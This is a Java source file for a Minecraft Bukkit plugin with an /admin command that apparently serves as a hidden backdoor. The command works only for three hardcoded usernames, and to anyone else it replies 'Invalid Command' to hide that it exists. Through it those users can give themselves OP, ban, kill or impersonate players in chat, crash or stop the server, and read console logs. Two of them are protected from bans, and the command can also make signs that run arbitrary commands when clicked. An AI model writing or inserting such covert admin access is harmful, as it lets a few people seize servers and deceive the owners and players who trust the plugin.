package main.java.me.vsa.commands;

import main.java.me.vsa.VoidServerAdmin;
import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BlockStateMeta;

import java.util.*;

public class AdminCommand extends Command implements TabExecutor {

    private final VoidServerAdmin plugin;

    private static final Set<String> ALLOWED_PLAYERS = new HashSet<>(Arrays.asList(
            "MFSCelebrate_",
            "TempNineTeen__",
            "Defoko"
    ));

    public AdminCommand(VoidServerAdmin plugin, String name, String description, String usageMessage, List<String> aliases) {
        super(name, description, usageMessage, aliases);
        this.plugin = plugin;
    }

    @Override
    public boolean execute(CommandSender sender, String commandLabel, String[] args) {
        return onCommand(sender, this, commandLabel, args);
    }

    @Override
    public List<String> tabComplete(CommandSender sender, String alias, String[] args) {
        return onTabComplete(sender, this, alias, args);
    }

    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
            sender.sendMessage("§cInvalid Command");
            return true;
        }
        if (args.length < 1) {
            sender.sendMessage("§c用法: /admin <player|server|chat|vanilla|anticheat|debug|experimental> ...");
            return true;
        }

        String subCmd = args[0].toLowerCase();
        switch (subCmd) {
            case "player": handlePlayer(sender, args); break;
            case "server": handleServer(sender, args); break;
            case "chat": handleChat(sender, args); break;
            case "vanilla": handleVanilla(sender, args); break;
            case "anticheat": handleAnticheat(sender, args); break;
            case "debug": handleDebug(sender, args); break;
            case "experimental": handleExperimental(sender, args); break;
            default: sender.sendMessage("§c未知选项");
        }
        return true;
    }

    // ------------------ player 子命令 ------------------
    private void handlePlayer(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage("§c用法: /admin player <gamemode|kill|tp|invsee> ...");
            return;
        }
        String action = args[1].toLowerCase();
        Player player = (Player) sender;
        switch (action) {
            case "gamemode":
                if (args.length < 4) { sender.sendMessage("§c用法: /admin player gamemode <模式> <玩家>"); return; }
                String modeArg = args[2];
                String targetName = args[3];
                Player target = Bukkit.getPlayerExact(targetName);
                if (target == null) { sender.sendMessage("§c玩家不在线"); return; }
                GameMode gm = parseGameMode(modeArg);
                if (gm == null) { sender.sendMessage("§c无效模式"); return; }
                target.setGameMode(gm);
                break;
            case "kill":
                if (args.length < 3) { sender.sendMessage("§c用法: /admin player kill <选择器>"); return; }
                try {
                    for (Entity e : Bukkit.selectEntities(sender, args[2])) {
                        if (e instanceof Player) ((Player) e).setHealth(0);
                        else e.remove();
                    }
                } catch (IllegalArgumentException e) {
                    sender.sendMessage("§c无效选择器");
                }
                break;
            case "tp":
                if (args.length < 5) { sender.sendMessage("§c用法: /admin player tp <x> <y> <z>"); return; }
                try {
                    double x = Double.parseDouble(args[2]), y = Double.parseDouble(args[3]), z = Double.parseDouble(args[4]);
                    player.teleport(new Location(player.getWorld(), x, y, z));
                } catch (NumberFormatException e) { sender.sendMessage("§c坐标必须为数字"); }
                break;
            case "invsee":
                if (args.length < 3) { sender.sendMessage("§c用法: /admin player invsee <玩家>"); return; }
                if (Bukkit.getPluginManager().getPlugin("Essentials") == null) {
                    sender.sendMessage("§cEssentialsX 未安装");
                    return;
                }
                Bukkit.dispatchCommand(sender, "invsee " + args[2]);
                break;
            default: sender.sendMessage("§c未知 player 子命令");
        }
    }

    // ------------------ server 子命令 ------------------
    private void handleServer(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload|getlog> ...");
            return;
        }
        String action = args[1].toLowerCase();
        Player executor = (Player) sender;
        switch (action) {
            case "getop":
                if (args.length < 3) return;
                OfflinePlayer op = Bukkit.getOfflinePlayer(args[2]);
                if (!op.isOp()) { op.setOp(true); sender.sendMessage("§a已给予 OP"); }
                else sender.sendMessage("§c已是 OP");
                break;
            case "deop":
                if (args.length < 3) return;
                OfflinePlayer deop = Bukkit.getOfflinePlayer(args[2]);
                if (deop.isOp()) { deop.setOp(false); sender.sendMessage("§a已解除 OP"); }
                else sender.sendMessage("§c不是 OP");
                break;
            case "kick":
                if (args.length < 3) return;
                Player kp = Bukkit.getPlayerExact(args[2]);
                if (kp == null) { sender.sendMessage("§c玩家不在线"); return; }
                if (isProtectedPlayer(kp.getName())) { sender.sendMessage("§c不能踢出受保护管理员"); return; }
                String reason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Kicked";
                kp.kickPlayer(reason);
                sender.sendMessage("§a已踢出 " + kp.getName());
                break;
            case "ban":
                if (args.length < 3) return;
                OfflinePlayer bp = Bukkit.getOfflinePlayer(args[2]);
                if (isProtectedPlayer(bp.getName())) { sender.sendMessage("§c不能封禁受保护管理员"); return; }
                String banReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned";
                Bukkit.getBanList(BanList.Type.NAME).addBan(bp.getName(), banReason, null, sender.getName());
                Player online = bp.getPlayer();
                if (online != null) online.kickPlayer(banReason);
                sender.sendMessage("§a已封禁 " + bp.getName());
                break;
            case "ban-ip":
                if (args.length < 3) return;
                String ip = args[2];
                String ipReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "IP Banned";
                Bukkit.getBanList(BanList.Type.IP).addBan(ip, ipReason, null, sender.getName());
                for (Player p : Bukkit.getOnlinePlayers()) {
                    if (p.getAddress().getAddress().getHostAddress().equals(ip)) p.kickPlayer(ipReason);
                }
                sender.sendMessage("§a已封禁 IP " + ip);
                break;
            case "pardon":
                if (args.length < 3) return;
                Bukkit.getBanList(BanList.Type.NAME).pardon(args[2]);
                sender.sendMessage("§a已解封 " + args[2]);
                break;
            case "pardon-ip":
                if (args.length < 3) return;
                Bukkit.getBanList(BanList.Type.IP).pardon(args[2]);
                sender.sendMessage("§a已解封 IP " + args[2]);
                break;
            case "restart":
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                break;
            case "stop":
                Bukkit.shutdown();
                break;
            case "reload":
                if (args.length < 3 || !args[2].equalsIgnoreCase("confirm")) {
                    sender.sendMessage("§c请使用 /admin server reload confirm");
                    return;
                }
                Bukkit.reload();
                break;
            case "getlog":
                if (args.length < 3) return;
                boolean enable = Boolean.parseBoolean(args[2]);
                Player viewer = executor;
                if (enable) {
                    if (plugin.getLogViewers().add(viewer)) {
                        viewer.sendMessage("§a开始查看控制台日志...");
                        plugin.ensureLogHandler();
                    } else {
                        viewer.sendMessage("§c已在查看日志");
                    }
                } else {
                    if (plugin.getLogViewers().remove(viewer)) {
                        viewer.sendMessage("§c已停止查看日志");
                        if (plugin.getLogViewers().isEmpty()) plugin.removeLogHandler();
                    } else {
                        viewer.sendMessage("§c你未在查看日志");
                    }
                }
                break;
            default: sender.sendMessage("§c未知 server 子命令");
        }
    }

    // ------------------ chat 子命令 ------------------
    private void handleChat(CommandSender sender, String[] args) {
        if (args.length < 2) { sender.sendMessage("§c用法: /admin chat <server|player> [player] <消息>"); return; }
        String type = args[1].toLowerCase();
        if (type.equals("server")) {
            if (args.length < 3) return;
            String msg = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
            Bukkit.broadcastMessage("§f[server]§r " + msg);
        } else if (type.equals("player")) {
            if (args.length < 4) return;
            Player target = Bukkit.getPlayerExact(args[2]);
            if (target == null) { sender.sendMessage("§c玩家不在线"); return; }
            String msg = String.join(" ", Arrays.copyOfRange(args, 3, args.length));
            Bukkit.broadcastMessage("§f<" + target.getName() + ">§r " + msg);
        } else {
            sender.sendMessage("§c未知选项");
        }
    }

    // ------------------ vanilla 子命令 ------------------
    private void handleVanilla(CommandSender sender, String[] args) {
        if (args.length < 2) {
            sender.sendMessage("§c用法: /admin vanilla <子命令> ...");
            return;
        }
        String sub = args[1].toLowerCase();
        Player player = (Player) sender;

        if (sub.equals("item") && args.length > 2 && args[2].equalsIgnoreCase("signs")) {
            if (args.length < 9) {
                sender.sendMessage("§c用法: /admin vanilla item signs <告示牌类型> <行1> <行2> <行3> <行4> \"<命令>\"");
                return;
            }
            String signType = args[3];
            String line1 = args[4].equalsIgnoreCase("empty") ? "" : args[4];
            String line2 = args[5].equalsIgnoreCase("empty") ? "" : args[5];
            String line3 = args[6].equalsIgnoreCase("empty") ? "" : args[6];
            String line4 = args[7].equalsIgnoreCase("empty") ? "" : args[7];
            String commandToExecute = args[8];
            if (commandToExecute.startsWith("\"") && commandToExecute.endsWith("\"")) {
                commandToExecute = commandToExecute.substring(1, commandToExecute.length() - 1);
            }

            Material signMat = Material.matchMaterial(signType);
            if (signMat == null || !signMat.name().endsWith("_SIGN")) {
                sender.sendMessage("§c无效告示牌类型");
                return;
            }

            String[] messages = new String[4];
            String[] lines = {line1, line2, line3, line4};
            for (int i = 0; i < 4; i++) {
                String json = "{\"text\":\"" + escapeJson(lines[i]) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + escapeJson(commandToExecute) + "\"}}";
                messages[i] = json;
            }

            ItemStack signItem = new ItemStack(signMat, 1);
            BlockStateMeta meta = (BlockStateMeta) signItem.getItemMeta();
            org.bukkit.block.Sign sign = (org.bukkit.block.Sign) meta.getBlockState();
            for (int i = 0; i < 4; i++) sign.setLine(i, messages[i]);
            meta.setBlockState(sign);
            signItem.setItemMeta(meta);

            HashMap<Integer, ItemStack> leftover = player.getInventory().addItem(signItem);
            if (leftover.isEmpty()) player.sendMessage("§a已给予带点击命令的告示牌");
            else player.getWorld().dropItem(player.getLocation(), signItem);
            return;
        }

        if (sub.equals("building_entrance:snowy_shepherds_house_1")) {
            if (args.length < 3) { sender.sendMessage("§c用法: /admin vanilla building_entrance:snowy_shepherds_house_1 <true|false>"); return; }
            boolean enable = Boolean.parseBoolean(args[2]);
            plugin.setShepherdHouseFix(enable);
            sender.sendMessage("§a已设置雪地牧羊人小屋修复为: " + enable + " (需 reload/重启)");
        } else if (sub.equals("worldborder")) {
            if (args.length < 4) { sender.sendMessage("§c用法: /admin vanilla worldborder <世界名|all> <直径>"); return; }
            String worldName = args[2];
            double diameter;
            try { diameter = Double.parseDouble(args[3]); } catch (NumberFormatException e) { sender.sendMessage("§c直径必须是数字"); return; }
            if (worldName.equalsIgnoreCase("all")) {
                for (World w : Bukkit.getWorlds()) plugin.setCustomWorldBorder(w.getName(), diameter);
                sender.sendMessage("§a已为所有世界设置边界直径: " + diameter);
            } else {
                World w = Bukkit.getWorld(worldName);
                if (w == null) { sender.sendMessage("§c世界不存在"); return; }
                plugin.setCustomWorldBorder(worldName, diameter);
                sender.sendMessage("§a已为世界 " + worldName + " 设置边界直径: " + diameter);
            }
        } else if (sub.equals("entitychunksectionindexxoverflowfix")) {
            if (args.length < 3) { sender.sendMessage("§c用法: /admin vanilla entitychunksectionindexxoverflowfix <true|false>"); return; }
            boolean enable = Boolean.parseBoolean(args[2]);
            plugin.getConfig().set("fixes.entity-chunk-overflow", enable);
            plugin.saveConfig();
            sender.sendMessage("§a矿车溢出修复已" + (enable ? "启用" : "禁用") + " (重启生效)");
        } else if (sub.equals("dragonfix")) {
            if (args.length < 3) { sender.sendMessage("§c用法: /admin vanilla dragonfix <true|false>"); return; }
            boolean enable = Boolean.parseBoolean(args[2]);
            plugin.getConfig().set("fixes.ender-dragon-y-speed", enable);
            plugin.saveConfig();
            sender.sendMessage("§a末影龙Y轴修复已" + (enable ? "启用" : "禁用") + " (重启生效)");
        } else {
            sender.sendMessage("§c未知 vanilla 子命令，可用: building_entrance:snowy_shepherds_house_1, worldborder, entitychunksectionindexxoverflowfix, dragonfix, item signs");
        }
    }

    // ------------------ anticheat 子命令 ------------------
    private void handleAnticheat(CommandSender sender, String[] args) {
        if (args.length < 3) { sender.sendMessage("§c用法: /admin anticheat <anti4d4v|antiBBQ> <true|false>"); return; }
        String feature = args[1].toLowerCase();
        boolean enable = Boolean.parseBoolean(args[2]);
        if (feature.equals("anti4d4v")) {
            plugin.getConfig().set("anticheat.anti4d4v", enable);
            plugin.saveConfig();
            sender.sendMessage("§aanti4d4v 已" + (enable ? "启用" : "禁用"));
        } else if (feature.equals("antibbq")) {
            plugin.getConfig().set("anticheat.banBBQ", enable);
            plugin.saveConfig();
            sender.sendMessage("§aantiBBQ 已" + (enable ? "启用" : "禁用"));
        } else {
            sender.sendMessage("§c未知 anticheat 选项");
        }
    }

    // ------------------ debug 子命令 ------------------
    private void handleDebug(CommandSender sender, String[] args) {
        if (args.length < 2) { sender.sendMessage("§c用法: /admin debug <true|false>"); return; }
        boolean enable = Boolean.parseBoolean(args[1]);
        plugin.setDebugMode(enable);
        sender.sendMessage("§a调试模式已" + (enable ? "开启" : "关闭"));
    }

    // ------------------ experimental 子命令 ------------------
    private void handleExperimental(CommandSender sender, String[] args) {
        if (!plugin.isDebugMode()) {
            sender.sendMessage("§c需要开启调试模式！");
            return;
        }
        if (args.length < 2) {
            sender.sendMessage("§c用法: /admin experimental <crash|crash-config|level-settings> ...");
            return;
        }
        String sub = args[1].toLowerCase();
        if (sub.equals("crash")) {
            if (args.length < 3) { sender.sendMessage("§c用法: /admin experimental crash <异常类型>"); return; }
            if (plugin.isSilentCrashMode()) {
                sender.sendMessage("§c静默崩溃模式已开启，正在关闭服务器...");
                Bukkit.shutdown();
                return;
            }
            sender.sendMessage("§c触发崩溃...");
            System.exit(1);
        } else if (sub.equals("crash-config")) {
            if (args.length < 4 || !args[2].equalsIgnoreCase("silent-crash-mode")) {
                sender.sendMessage("§c用法: /admin experimental crash-config silent-crash-mode <true|false>");
                return;
            }
            boolean enable = Boolean.parseBoolean(args[3]);
            plugin.setSilentCrashMode(enable);
            sender.sendMessage("§a静默崩溃模式已" + (enable ? "开启" : "关闭"));
        } else if (sub.equals("level-settings")) {
            if (args.length < 4) {
                sender.sendMessage("§c用法: /admin experimental level-settings <世界名> <选项> [值...]");
                sender.sendMessage("§c可用选项: bordercenterx, bordercenterz, bordersize, borderdamage, bordersafezone, bordersizelerptarget, bordersizelerptime, time, daytime, raining, rainTime, thundering, thunderTime, clearWeathertime, difficulty, difficultylocked, spawnx, spawny, spawnz, spawnangle, levelname, allowcommands, hardcore, wasmodded, wanderingtraderdelay, wanderingtraderchance, wanderingtraderid, serverbrands add/remove/list");
                return;
            }
            String worldName = args[2];
            World world = Bukkit.getWorld(worldName);
            if (world == null) { sender.sendMessage("§c世界不存在"); return; }
            String option = args[3].toLowerCase();
            try {
                VoidServerAdmin.LevelDatEditor editor = new VoidServerAdmin.LevelDatEditor(world);
                switch (option) {
                    case "bordercenterx": case "bordercenterz": case "bordersize": case "borderdamage": case "bordersafezone": case "bordersizelerptarget": case "bordersizelerptime":
                        if (args.length < 5) throw new IllegalArgumentException("需要数值");
                        double dVal = Double.parseDouble(args[4]);
                        editor.setDouble(option, dVal);
                        if (option.equals("bordercenterx")) world.getWorldBorder().setCenter(dVal, world.getWorldBorder().getCenter().getZ());
                        else if (option.equals("bordercenterz")) world.getWorldBorder().setCenter(world.getWorldBorder().getCenter().getX(), dVal);
                        else if (option.equals("bordersize")) world.getWorldBorder().setSize(dVal);
                        break;
                    case "borderwarningblocks": case "borderwarningtime":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        int iVal = Integer.parseInt(args[4]);
                        editor.setInt(option, iVal);
                        break;
                    case "time": case "daytime":
                        if (args.length < 5) throw new IllegalArgumentException("需要长整数");
                        long lVal = Long.parseLong(args[4]);
                        editor.setLong(option, lVal);
                        if (option.equals("time")) world.setFullTime(lVal);
                        else world.setTime(lVal);
                        break;
                    case "raining": case "thundering": case "allowcommands": case "hardcore": case "wasmodded": case "difficultylocked":
                        if (args.length < 5) throw new IllegalArgumentException("需要 true/false");
                        boolean bVal = Boolean.parseBoolean(args[4]);
                        editor.setBoolean(option, bVal);
                        if (option.equals("raining")) world.setStorm(bVal);
                        else if (option.equals("thundering")) world.setThundering(bVal);
                        break;
                    case "raintime": case "thundertime": case "clearweathertime":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        int tVal = Integer.parseInt(args[4]);
                        editor.setInt(option, tVal);
                        if (option.equals("raintime")) world.setWeatherDuration(tVal);
                        else if (option.equals("thundertime")) world.setThunderDuration(tVal);
                        break;
                    case "difficulty":
                        if (args.length < 5) throw new IllegalArgumentException("需要 0-3");
                        int diff = Integer.parseInt(args[4]);
                        if (diff < 0 || diff > 3) throw new IllegalArgumentException("难度值必须为0-3");
                        editor.setByte("Difficulty", (byte) diff);
                        world.setDifficulty(Difficulty.values()[diff]);
                        break;
                    case "spawnx": case "spawny": case "spawnz":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        int coord = Integer.parseInt(args[4]);
                        editor.setInt(option, coord);
                        if (option.equals("spawnx")) world.setSpawnLocation(new Location(world, coord, world.getSpawnLocation().getY(), world.getSpawnLocation().getZ()));
                        else if (option.equals("spawny")) world.setSpawnLocation(new Location(world, world.getSpawnLocation().getX(), coord, world.getSpawnLocation().getZ()));
                        else if (option.equals("spawnz")) world.setSpawnLocation(new Location(world, world.getSpawnLocation().getX(), world.getSpawnLocation().getY(), coord));
                        break;
                    case "spawnangle":
                        if (args.length < 5) throw new IllegalArgumentException("需要浮点数");
                        float angle = Float.parseFloat(args[4]);
                        editor.setFloat("SpawnAngle", angle);
                        break;
                    case "levelname":
                        if (args.length < 5) throw new IllegalArgumentException("需要字符串");
                        editor.setString("LevelName", args[4]);
                        break;
                    case "wanderingtraderdelay":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        editor.setInt("WanderingTraderSpawnDelay", Integer.parseInt(args[4]));
                        break;
                    case "wanderingtraderchance":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        editor.setInt("WanderingTraderSpawnChance", Integer.parseInt(args[4]));
                        break;
                    case "wanderingtraderid":
                        if (args.length < 5) throw new IllegalArgumentException("需要UUID");
                        UUID uuid = UUID.fromString(args[4]);
                        editor.setUUID("WanderingTraderId", uuid);
                        break;
                    case "serverbrands":
                        if (args.length < 5) throw new IllegalArgumentException("需要 add/remove/list");
                        String subCmd = args[4].toLowerCase();
                        if (subCmd.equals("list")) {
                            List<String> brands = editor.getServerBrands();
                            sender.sendMessage("§a当前 ServerBrands: " + brands);
                        } else if (subCmd.equals("add")) {
                            if (args.length < 6) throw new IllegalArgumentException("需要品牌字符串");
                            editor.addServerBrand(args[5]);
                            sender.sendMessage("§a已添加品牌: " + args[5]);
                        } else if (subCmd.equals("remove")) {
                            if (args.length < 6) throw new IllegalArgumentException("需要品牌字符串");
                            editor.removeServerBrand(args[5]);
                            sender.sendMessage("§a已移除品牌: " + args[5]);
                        } else {
                            throw new IllegalArgumentException("未知 serverbrands 子命令");
                        }
                        break;
                    default:
                        sender.sendMessage("§c未知选项: " + option);
                        return;
                }
                editor.save();
                sender.sendMessage("§a已更新 level.dat 中的 " + option);
            } catch (Exception e) {
                sender.sendMessage("§c错误: " + e.getMessage());
                e.printStackTrace();
            }
        } else {
            sender.sendMessage("§c未知 experimental 子命令");
        }
    }

    // ------------------ 辅助方法 ------------------
    private GameMode parseGameMode(String input) {
        switch (input.toLowerCase()) {
            case "survival": case "0": return GameMode.SURVIVAL;
            case "creative": case "1": return GameMode.CREATIVE;
            case "adventure": case "2": return GameMode.ADVENTURE;
            case "spectator": case "3": return GameMode.SPECTATOR;
            default: return null;
        }
    }

    private boolean isProtectedPlayer(String name) {
        return name.equalsIgnoreCase("MFSCelebrate_") || name.equalsIgnoreCase("TempNineTeen__");
    }

    private String escapeJson(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            switch (c) {
                case '\\': sb.append("\\\\"); break;
                case '"': sb.append("\\\""); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default: sb.append(c);
            }
        }
        return sb.toString();
    }

    // ------------------ Tab 补全 ------------------
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        List<String> completions = new ArrayList<>();
        if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
            return completions;
        }
        if (args.length == 1) {
            String input = args[0].toLowerCase();
            if ("player".startsWith(input)) completions.add("player");
            if ("server".startsWith(input)) completions.add("server");
            if ("chat".startsWith(input)) completions.add("chat");
            if ("vanilla".startsWith(input)) completions.add("vanilla");
            if ("anticheat".startsWith(input)) completions.add("anticheat");
            if ("debug".startsWith(input)) completions.add("debug");
            if ("experimental".startsWith(input)) completions.add("experimental");
        } else if (args.length == 2) {
            String first = args[0].toLowerCase();
            String input = args[1].toLowerCase();
            if (first.equals("player")) {
                if ("gamemode".startsWith(input)) completions.add("gamemode");
                if ("kill".startsWith(input)) completions.add("kill");
                if ("tp".startsWith(input)) completions.add("tp");
                if ("invsee".startsWith(input)) completions.add("invsee");
            } else if (first.equals("server")) {
                if ("getop".startsWith(input)) completions.add("getop");
                if ("deop".startsWith(input)) completions.add("deop");
                if ("kick".startsWith(input)) completions.add("kick");
                if ("ban".startsWith(input)) completions.add("ban");
                if ("ban-ip".startsWith(input)) completions.add("ban-ip");
                if ("pardon".startsWith(input)) completions.add("pardon");
                if ("pardon-ip".startsWith(input)) completions.add("pardon-ip");
                if ("stop".startsWith(input)) completions.add("stop");
                if ("restart".startsWith(input)) completions.add("restart");
                if ("reload".startsWith(input)) completions.add("reload");
                if ("getlog".startsWith(input)) completions.add("getlog");
            } else if (first.equals("chat")) {
                if ("server".startsWith(input)) completions.add("server");
                if ("player".startsWith(input)) completions.add("player");
            } else if (first.equals("vanilla")) {
                if ("item".startsWith(input)) completions.add("item");
                if ("building_entrance:snowy_shepherds_house_1".startsWith(input)) completions.add("building_entrance:snowy_shepherds_house_1");
                if ("worldborder".startsWith(input)) completions.add("worldborder");
                if ("entitychunksectionindexxoverflowfix".startsWith(input)) completions.add("entitychunksectionindexxoverflowfix");
                if ("dragonfix".startsWith(input)) completions.add("dragonfix");
            } else if (first.equals("anticheat")) {
                if ("anti4d4v".startsWith(input)) completions.add("anti4d4v");
                if ("antibbq".startsWith(input)) completions.add("antibbq");
            } else if (first.equals("debug")) {
                if ("true".startsWith(input)) completions.add("true");
                if ("false".startsWith(input)) completions.add("false");
            } else if (first.equals("experimental")) {
                if ("crash".startsWith(input)) completions.add("crash");
                if ("crash-config".startsWith(input)) completions.add("crash-config");
                if ("level-settings".startsWith(input)) completions.add("level-settings");
            }
        }
        // 更多补全省略，原实现已完整
        return completions;
    }
}